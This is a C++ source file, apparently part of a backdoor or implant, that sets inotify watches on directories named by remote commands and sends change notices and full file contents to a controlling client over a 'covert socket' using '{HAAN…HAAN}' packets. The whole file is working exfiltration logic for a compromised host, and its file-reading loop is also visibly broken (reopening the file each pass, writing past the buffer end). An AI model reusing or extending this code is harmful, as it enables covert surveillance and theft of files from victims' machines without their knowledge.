//
// Created by root on 24/11/16.
//

#include "FileSystemManager.h"
#include "../../shared/utils/Logger.h"
#include <sys/inotify.h>
#include <sys/select.h>
#include <cstring>
#include <zconf.h>
#include <fstream>

FileSystemManager::FileSystemManager(CovertSocketQueue *covertSocketQueue) {
    this->covertSocketQueue = covertSocketQueue;

    this->inotifyFD = inotify_init();
    if(this->inotifyFD < 0){
        Logger::debug("FileSystemManager - Failed To Create inotifyFD. Can't Do File Syncs: " + string(strerror(errno)));

        string answer = "{HAAN";
        answer += (char)MessageType::FILEANSWER;
        answer += "inotify Failed. Unable To SyncHAAN}";

        this->covertSocketQueue->addPacketToSend(answer);
    }
}

FileSystemManager::~FileSystemManager() {
    close(this->inotifyFD);
}

/**
 * updateNotifyEvents updates the inotify events to be listened on by the hangForEvents function. The passed in message
 * is assumed to be either a FILE or FILESYNC message and is parsed to determine if an inotify event is already configured
 * for the directory specified. IF the directory exists, the existing inotify event is removed. If it does not, then it is
 * added to the listener
 * @param message Message - A Message object representation of a HAAN packet
 * @return Bool - State as to whether update was successful or not
 */
bool FileSystemManager::updateNotifyEvents(Message message) {

    //check if we are already listening in this directory
    map<std::string, int>::iterator it = this->inverseFileEventCommands.find(message.data);

    //if we are, then assume we are removing it
    if(it != this->inverseFileEventCommands.end()){
        //this means the mapping exists

        //we assume to delete it
        int value = this->inverseFileEventCommands.at(message.data);

        int status = inotify_rm_watch(this->inotifyFD, value);

        if(status){
            //error
            Logger::debug("FileSystemManager - Failed To Remove Watch For Directory: " + string(strerror(errno)));

            string answer = "{HAAN";
            answer += (char)MessageType::FILEANSWER;
            answer += "Removal of inotifywatch for directory ";
            answer += message.data.c_str();
            answer += " failedHAAN}";
            this->covertSocketQueue->addPacketToSend(answer);

        }else{
            this->inverseFileEventCommands.erase(message.data);
            this->fileEventCommands.erase(value);

            MessageType::MessageTypeEnum originalMessageType = this->eventTypeMap.at(value);
            this->eventTypeMap.erase(value);
        }

    }else{
        //if we are not, then assume we are adding it

        int ifd = inotify_add_watch(this->inotifyFD, message.data.c_str(), (uint32_t) IN_CLOSE_WRITE);

        if(ifd < 0){
            Logger::debug("FileSystemManager - Failed To Add Watch For Directory: " + string(strerror(errno)));

            string answer = "{HAAN";
            answer += (char)MessageType::FILEANSWER;
            answer += "Creation of inotifywatch for directory ";
            answer += message.data.c_str();
            answer += " failedHAAN}";

            this->covertSocketQueue->addPacketToSend(answer);
        }else{
            Logger::debug("FileSystemManager - Successfully Created File Watch For Directory " + message.data);

            this->inverseFileEventCommands.insert(std::pair<std::string, int>(message.data,ifd));
            this->fileEventCommands.insert(std::pair<int, std::string>(ifd, message.data));
            this->eventTypeMap.insert(std::pair<int, MessageType::MessageTypeEnum>(ifd, message.messageType));

        }
    };
}

/**
 * hangForEvents is the main functionality method for the FileSystemMAnager. hangForEvents configures select with the
 * current inotify configuration. It then hangs waiting for events for up to 10 seconds before returning. Upon returning
 * if events have occurred, they are then processed based on their origina and appropriate messages are sent packet to
 * the client via the CovertSocketQueue and the function returns. If the return is due to a timeout, the function
 * returns doing nothing.
 */
void FileSystemManager::hangForEvents() {

    Logger::debug("FileSystemManager:hangForEvents - Creating Structures Before Hang");


    const unsigned int EVENTSIZE = sizeof(struct inotify_event);
    const unsigned int BUFFERLEN = (1024 * (EVENTSIZE + 16));
    char BUFFER[BUFFERLEN];

    memset(BUFFER, 0 , BUFFERLEN);

    long bytesRead = 0;
    int resultCount = 0;

    fd_set rfds;
    FD_ZERO(&rfds);
    FD_SET(this->inotifyFD, &rfds);

    struct timeval maxWaitTime;
    maxWaitTime.tv_usec = 0;
    maxWaitTime.tv_sec = 10;

    Logger::debug("FileSystemManager:hangForEvents - Now Hanging");
    resultCount = select(this->inotifyFD + 1, &rfds, NULL, NULL, &maxWaitTime); // at max this select will take 10 seconds before it returns

    if(resultCount < 0){
        Logger::debug("FileSystemManager:hangForEvents - There Was An Error On Select. Could Not Process Any Events");
        return;
    }else if(!resultCount){
        Logger::debug("FileSystemManager:hangForEvents - Select Returned From Timeout. Not From Any Events");
        return;
    }else if(FD_ISSET(this->inotifyFD, &rfds)){
        Logger::debug("FileSystemManager:hangForEvents - Select Returned From Events. Now Processing");

        //read out the events into the buffer
        bytesRead = read(this->inotifyFD, BUFFER, BUFFERLEN);

        if(bytesRead < 0){
            if(errno == EINTR){
                Logger::debug("FileSystemManager:hangForEvents - There Was An Error From Select. It Was Not Detected Until Read? Could Not Process Events");
                return;
            }else{
                Logger::debug("FileSystemManager:hangForEvents - There Was An Error From Select: " + string(strerror(errno)));
                return;
            }
        }else if(bytesRead == 0){
            Logger::debug("FileSystemManager:hangForEvents - The BUFFERLEN Is Not Long Enough To Process All Events. Can Only Process What We Have So Far");
            //TODO: What do I do in this case?
        }

        long i = 0;
        while(i < bytesRead){
            static struct inotify_event *event;
            event = (struct inotify_event *) &BUFFER[i];

            //process this event here
            if(event->mask == IN_CLOSE_WRITE){

                //this is an event we expect

                if(event->len == 0){
                    Logger::debug("FileSystemManger:hangForEvents - We Are Listening On A File. Not A Directory. Invalid Listener");
                }else{
                    string directory = this->fileEventCommands.at(event->wd);
                    string fileName = string(event->name);
                    Logger::debug("FileSystemManager:hangForEvents - Event Found From File: " + string(event->name)
                                  + " Of Directory: " + directory +". Full Path: " + directory + "/" + string(event->name));

                    string fullPath = directory + "/" + fileName;

                    Logger::debug(fullPath);


                    MessageType::MessageTypeEnum cmdType = this->eventTypeMap.at(event->wd);
                    //determine command type. If FILE then just send a notification, if FILESYNC then read and process file

                    if(cmdType == MessageType::FILE){

                        string answer = "{HAAN";
                        answer += (char)MessageType::FILEANSWER;
                        answer += "0File Event Occurred In Directory: ";
                        answer += fullPath;
                        answer += "HAAN}";

                        this->covertSocketQueue->addPacketToSend(answer);

                    }else if(cmdType == MessageType::FILESYNC){

                        string warning = "{HAAN";
                        warning += (char)MessageType::FILEANSWER;
                        warning += "1File Event Occurred For Sync File In Directory: ";
                        warning += fullPath;
                        warning += "HAAN}";

                        this->covertSocketQueue->addPacketToSend(warning);

                        int FILEBUFFERLEN = 1024;
                        char FILEBUFFER[FILEBUFFERLEN];

                        //read the file contents
                        ifstream reader;
                        string fileContents = "";

                        while(reader.eof() == false){
                            reader.open(fullPath.c_str(), ios::in | ios::binary);
                            reader.read(FILEBUFFER, FILEBUFFERLEN);

                            FILEBUFFER[FILEBUFFERLEN] = '\0';
                            string strFileBuffer(FILEBUFFER);

                            fileContents += strFileBuffer;
                        }

                        reader.close();
                        //create a packet with it
                        string answer = "{HAAN";
                        answer += (char)MessageType::FILEDWNLD;
                        answer += fileContents;
                        answer += "HAAN}";

                        //pass it to the CovertSocketQueue
                        this->covertSocketQueue->addPacketToSend(answer);

                    }else{
                        Logger::debug("FileSystemManager:hangForEvents - No Defined Functionality For This Type Of Command. Can't Process File Event");
                    }




                }


            }else{
                Logger::debug("FileSystemManager:hangForEvents - Somehow Got An Event Mask That Was Not Registered For. PROBLEM ERROR");
            }


            //iterate forward to the next event
            i += EVENTSIZE + event->len;
        }



    }else{
        Logger::debug("FileSystemManager:hangForEvents - Select Returned For An Unknown Reason");
        return;
    }

}